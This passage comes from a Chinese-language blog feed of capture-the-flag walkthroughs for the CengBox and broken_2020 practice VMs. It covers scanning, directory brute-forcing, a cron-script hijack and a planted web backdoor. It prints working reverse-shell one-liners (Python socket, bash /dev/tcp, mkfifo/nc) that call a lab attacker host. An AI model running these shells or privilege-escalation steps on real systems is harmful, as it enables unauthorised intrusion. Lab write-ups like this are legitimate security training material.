class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">cengover@cengbox:/$ <span class="hljs-built_in">ls</span> -alih /etc/shadow /etc/passwd<br><span class="hljs-built_in">ls</span> -alih /etc/shadow /etc/passwd<br>132989 -rw-r--r-- 1 root root   1.6K Apr 25  2020 /etc/passwd<br>134692 -rw-r----- 1 root shadow 1.1K Apr 25  2020 /etc/shadow<br>cengover@cengbox:/$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><h3 id="pspy64-判断是否有定时任务"><a href="#pspy64-判断是否有定时任务" class="headerlink" title="pspy64 判断是否有定时任务"></a>pspy64 判断是否有定时任务</h3><p>ssh 登录后使用 pspy64 来看是否有定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">2023/10/16 15:39:01 CMD: UID=0     PID=2290   | /usr/bin/python3 /opt/md5check.py<br></code></pre></td></tr></table></figure><p>发现了一个 python 脚本在定时以 root 身份被运行，查看文件权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cengover@cengbox:/tmp$ <span class="hljs-built_in">ls</span> -liah /opt/md5check.py<br>916210 -rw-rw---- 1 root <span class="hljs-built_in">users</span> 545 Apr 29  2020 /opt/md5check.py<br></code></pre></td></tr></table></figure><p>而我们登录的用户也属于 users 组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cengover@cengbox:/tmp$ <span class="hljs-built_in">id</span><br>uid=1000(cengover) gid=1000(cengover) <span class="hljs-built_in">groups</span>=1000(cengover),4(adm),24(cdrom),30(dip),46(plugdev),100(<span class="hljs-built_in">users</span>),110(lxd),117(lpadmin),118(sambashare)<br></code></pre></td></tr></table></figure><h3 id="写入定时任务的脚本"><a href="#写入定时任务的脚本" class="headerlink" title="写入定时任务的脚本"></a>写入定时任务的脚本</h3><p>直接写入反弹 shell 的内容到此文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cengover@cengbox:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.101&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt; /opt/md5check.py<br></code></pre></td></tr></table></figure><p>cat 看下文件内容，确定写入成功</p><p>开启监听等待反弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.102] 56034<br>root@cengbox:~<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@cengbox:~<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@cengbox:~<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:f8:53:a5 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.1.102/24 brd 192.168.1.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fef8:53a5/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@cengbox:~<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux cengbox 4.4.0-177-generic <span class="hljs-comment">#207-Ubuntu SMP Mon Mar 16 01:16:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>成功获取到 root 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@cengbox:~<span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 48K<br>392450 drwx------  3 root root 4.0K Apr 29  2020 .<br>     2 drwxr-xr-x 23 root root 4.0K Apr 26  2020 ..<br>393878 -rw-------  1 root root    5 Apr 29  2020 .bash_history<br>392451 -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc<br>392654 drwxr-xr-x  2 root root 4.0K Apr 26  2020 .nano<br>393896 -rw-r--r--  1 root root 6.5K Oct 16 15:45 note.txt<br>392452 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>394459 -rw-r--r--  1 root root  420 Apr 29  2020 root.txt<br>392706 -rw-r--r--  1 root root   66 Apr 28  2020 .selected_editor<br>394464 -rw-------  1 root root 5.3K Apr 29  2020 .viminfo<br>root@cengbox:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br> / ____|  ____|           |  _ \           <br>| |    | |__   _ __   __ _| |_) | _____  __<br>| |    |  __| | <span class="hljs-string">&#x27;_ \ / _` |  _ &lt; / _ \ \/ /</span><br><span class="hljs-string">| |____| |____| | | | (_| | |_) | (_) &gt;  &lt; </span><br><span class="hljs-string"> \_____|______|_| |_|\__, |____/ \___/_/\_\</span><br><span class="hljs-string">                      __/ |                </span><br><span class="hljs-string">                     |___/                 </span><br><span class="hljs-string"></span><br><span class="hljs-string">Congrats. Hope you enjoyed it and you can contact me on Twitter @arslanblcn_</span><br><span class="hljs-string"></span><br><span class="hljs-string">a51e522b22a439b8e1b22d84f71cf0f2</span><br></code></pre></td></tr></table></figure><p>找下 flag，结束战斗</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不算难的靶机，需要一定的信息收集能力，包括对于二级目录的爆破和最后确定定时执行的文件脚本位置</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>broken_2020 靶机</title>
    <link href="/2023/10/18e513304239.html"/>
    <url>/2023/10/18e513304239.html</url>
    
    <content type="html"><![CDATA[<h1 id="broken-2020-靶机"><a href="#broken-2020-靶机" class="headerlink" title="broken_2020 靶机"></a>broken_2020 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.1.232     <br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:D3:A9:03 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>开放了 22 和 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.1.232    <br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 7e:f3:33:8c:be:0c:ed:d7:0e:c6:67:cc:73:bf:c0:ab (RSA)<br>|   256 ee:ed:74:02:0d:3f:7d:6d:45:aa:ff:f3:3a:d0:1a:d9 (ECDSA)<br>|_  256 d1:18:a9:ef:7f:b6:c8:a9:30:52:c8:e6:b6:ec:64:80 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Coming Soon<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 08:00:27:D3:A9:03 (Oracle VirtualBox virtual NIC)<br><br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 5.X<br>OS CPE: cpe:/o:linux:linux_kernel:5<br>OS details: Linux 5.0 - 5.5<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>Debian 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.1.232<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.38 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">MAC Address: 08:00:27:D3:A9:03 (Oracle VirtualBox virtual NIC)</span><br></code></pre></td></tr></table></figure><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p><code>/images/</code> 目录，先来目录爆破吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo dirsearch -u http://192.168.1.232       <br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>[10:23:58] 301 -  312B  - /cms  -&gt;  http://192.168.1.232/cms/               <br>[10:23:58] 200 -  438B  - /cms/                                             <br>[10:24:02] 301 -  314B  - /fonts  -&gt;  http://192.168.1.232/fonts/           <br>[10:24:04] 200 -    3KB - /images/                                          <br>[10:24:04] 301 -  315B  - /images  -&gt;  http://192.168.1.232/images/<br>[10:24:04] 200 -    1KB - /index.html                                       <br>[10:24:15] 403 -  278B  - /server-status/                                   <br>[10:24:15] 403 -  278B  - /server-status<br></code></pre></td></tr></table></figure><p>网页默认界面是提示新的 cms 正在准备中，网页源码中没隐藏信息</p><p><img src="/pic/0a80730e6945869c0b7a2e3b25c7a20d_MD5.png"></p><p><code>cms</code>进入后是个安装界面点击安装跳转到 <code>http://192.168.1.232/cms/?install=off</code></p><p><img src="/pic/fc43454d54a4a58cd9e8c8180643d7d8_MD5.png"></p><p>似乎是第一个 flag，但是安装界面再也回不去了</p><p>原本想试试换个更大的字典爆破，但是可能是爆破频率上去后靶机的响应就会有问题，所以只好暂时放弃</p><p>之后我对图片进行了查看，尝试发掘其中是否有隐写，font.jpg 倒是可能有 steghide 隐写，但是使用 stegseek 爆破不出口令</p><p>这里卡了一会，主要是在判断图片是否有信息隐藏，然后尝试对 cms 目录进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo dirsearch -u 192.168.1.232/cms/ <br><br>[22:40:32] 301 -  315B  - /cms/cc  -&gt;  http://192.168.1.232/cms/cc/         <br>[22:40:38] 200 -   67B  - /cms/index.html<br></code></pre></td></tr></table></figure><h2 id="网站后门反弹-shell"><a href="#网站后门反弹-shell" class="headerlink" title="网站后门反弹 shell"></a>网站后门反弹 shell</h2><p>发现了一个隐藏目录 cc，进去查看，好像是别人留的后门</p><p><img src="/pic/ff5c10eb570ec5511e8cfd5e13ae0696_MD5.png"></p><p>先使用 nc 开启监听试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo nc -lvnp 443                   <br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.232] 41466<br>GET /39b14733d3eb56a24f928abf52e115b4.sh HTTP/1.0<br>Host: 192.168.1.101:443<br>Connection: close<br></code></pre></td></tr></table></figure><p>是在请求一个文件 <code>39b14733d3eb56a24f928abf52e115b4.sh</code></p><p>我们先自己创建个包含反弹 shell 的同名文件，再用 python 开启个 web 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.101/443 0&gt;&amp;1&#x27;</span> &gt; 39b14733d3eb56a24f928abf52e115b4.sh<br><br>┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ python -m http.server 8088<br></code></pre></td></tr></table></figure><p>提前开启监听然后访问以下链接，从而反弹 shell <code>192.168.1.232/cms/cc/?ip=192.168.1.101&amp;port=8088</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.232] 41480<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (535): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux broken 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux</span><br>www-data@broken:/var/www/html$ <span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>www-data@broken:/var/www/html$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@broken:/var/www/html$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data:<br></code></pre></td></tr></table></figure><h2 id="用户移动"><a href="#用户移动" class="headerlink" title="用户移动"></a>用户移动</h2><p>反弹 shell 成功，看看敏感文件权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/var/www/html$ <span class="hljs-built_in">ls</span> -liah /etc/passwd /etc/shadow   <br><span class="hljs-built_in">ls</span> -liah /etc/passwd /etc/shadow <br>269342 -rw-r--r-- 1 root root   1.6K Mar 24  2020 /etc/passwd<br>269646 -rw-r----- 1 root shadow 1.1K Mar 26  2020 /etc/shadow<br></code></pre></td></tr></table></figure><p>查看网站目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 28K<br>7030 drwxr-xr-x 2 www-data www-data 4.0K Oct 16 04:48 .<br> 437 drwxr-xr-x 3 www-data www-data 4.0K Oct 15 16:37 ..<br>6671 -rw-r--r-- 1 www-data www-data   32 Oct 15 16:37 e425ef56a6ca4a3101e775d5019fb237.txt<br>  39 -rw-r--r-- 1 www-data www-data  164 Mar 24  2020 fe8b7cfd24a4ad396054c8cd2f44d296.py<br>7384 -rw-r--r-- 1 www-data www-data  992 Mar 24  2020 index.php<br>8655 -rw-r--r-- 1 www-data www-data   54 Oct 16 04:51 log.txt<br>8654 -rw-r--r-- 1 www-data www-data   82 Oct 16 04:51 shell.sh<br></code></pre></td></tr></table></figure><p>我们应该就是通过 shell.sh 后门进来的，看一眼 python 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">cat</span> fe8b7cfd24a4ad396054c8cd2f44d296.py<br><span class="hljs-built_in">cat</span> fe8b7cfd24a4ad396054c8cd2f44d296.py<br>import requests<br>import os<br><br>file = open(<span class="hljs-string">&quot;e425ef56a6ca4a3101e775d5019fb237.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>script=file.read()<br>file.close()<br><br><br>ip=<span class="hljs-string">&quot;test&quot;</span><br>url=<span class="hljs-string">&quot;http://&quot;</span>+ip+<span class="hljs-string">&quot;/&quot;</span>+script+<span class="hljs-string">&quot;.sh&quot;</span><br></code></pre></td></tr></table></figure><p>python 文件读取 txt 中的文件中的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">cat</span> e425ef56a6ca4a3101e775d5019fb237.txt<br>&lt;ml/cms/cc$ <span class="hljs-built_in">cat</span> e425ef56a6ca4a3101e775d5019fb237.txt<br>39b14733d3eb56a24f928abf52e115b4<br>www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">cat</span> shell.sh<br><span class="hljs-built_in">cat</span> shell.sh<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.101 443 &gt;/tmp/f<br></code></pre></td></tr></table></figure><p>txt 文件中保存着请求文件的名字，请求此文件，并将其写入 shell.sh 并运行。逻辑理清楚了，不过对提权没帮助，看看用户家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/home/alice$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 48K<br>  31 drwxr-xr-x 5 alice alice 4.0K Mar 26  2020 .<br> 193 drwxr-xr-x 3 root  root  4.0K Mar 24  2020 ..<br>6538 lrwxrwxrwx 1 alice alice    9 Mar 24  2020 .bash_history -&gt; /dev/null<br>  67 -rw-r--r-x 1 alice alice  220 Mar 24  2020 .bash_logout<br>7046 -rw-r--r-- 1 alice alice  570 Jan 31  2010 .bashrc<br>6523 drwxr-xr-x 3 alice alice 4.0K Mar 24  2020 .cache<br>6842 drwxr-xr-x 3 alice alice 4.0K Mar 24  2020 .<span class="hljs-built_in">local</span><br>  46 -rw-r--r-- 1 alice alice  148 Aug 17  2015 .profile<br>  54 -rw-r--r-- 1 alice alice   66 Mar 25  2020 .selected_editor<br>6982 -rw-r--r-- 1 alice alice  173 Mar 24  2020 .wget-hsts<br>7131 -rw-r--r-- 1 alice alice   29 Mar 25  2020 flag.txt<br>6841 -rw-r--r-- 1 alice alice  141 Mar 25  2020 note.txt<br>6859 drwxrwxrwx 2 alice alice 4.0K Mar 26  2020 script<br></code></pre></td></tr></table></figure><p>先把 flag 和 note 拿了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/home/alice$ <span class="hljs-built_in">cat</span> note.txt<br><span class="hljs-built_in">cat</span> note.txt<br>Alice, <br><br>Please <span class="hljs-keyword">do</span> not install TrustMeCMS, I need check the <span class="hljs-built_in">source</span> before<br><br>PS: I created a script to clear apache <span class="hljs-built_in">log</span> during the tests<br><br>root<br>www-data@broken:/home/alice$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br>&#123;FLAG2:**Robing the rober**&#125;<br></code></pre></td></tr></table></figure><p>root 写了个定时清除 apach 日志的脚本，还有个 script 目录看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/home/alice/script$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 16K<br>6859 drwxrwxrwx 2 alice alice 4.0K Mar 26  2020 .<br>  31 drwxr-xr-x 5 alice alice 4.0K Mar 26  2020 ..<br>6862 -rw-r--r-x 1 alice alice   48 Oct 16 04:57 clear.log<br>6861 -rwxr--r-- 1 alice alice  585 Mar 25  2020 log.py<br>www-data@broken:/home/alice/script$ <span class="hljs-built_in">cat</span> log.py<br><span class="hljs-built_in">cat</span> log.py<br><span class="hljs-comment">#!/usr/bin/python2.7</span><br>import requests<br>import os<br>import datetime<br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">#Juste in case I want stop this script remotly</span><br><span class="hljs-string"></span><br><span class="hljs-string">r = requests.get(&quot;</span>https://pastebin.com/raw/9vzu2CA5<span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">cmd=str(r.text)</span><br><span class="hljs-string">check =&quot;</span>stopit<span class="hljs-string">&quot;</span><br><span class="hljs-string">if check == cmd :</span><br><span class="hljs-string">        os.system(&#x27;cp /home/alice/script/log.py /home/alice/script/log.bak&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><br>path=<span class="hljs-string">&quot;/var/log/apache2&quot;</span><br><span class="hljs-built_in">dir</span> = os.listdir(path)<br><span class="hljs-built_in">date</span> = str(datetime.datetime.now())<br><span class="hljs-keyword">for</span> logfile <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span> :<br>        clear = open(path+<span class="hljs-string">&quot;/&quot;</span>+logfile, <span class="hljs-string">&quot;w&quot;</span>)<br>        clear.truncate(0)<br>        clear.close()<br>logfile = open(<span class="hljs-string">&quot;/home/alice/script/clear.log&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>logfile.write(<span class="hljs-string">&quot;last clear apache log &quot;</span>+<span class="hljs-built_in">date</span>)<br>logfile.close()<br></code></pre></td></tr></table></figure><p>清除日志的文件就是 clear.log，不过由于此文件我们没有更改权限，虽然这个目录是 777 权限</p><p>继续信息收集，在根目录下发现了 backup.py 和 back 文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 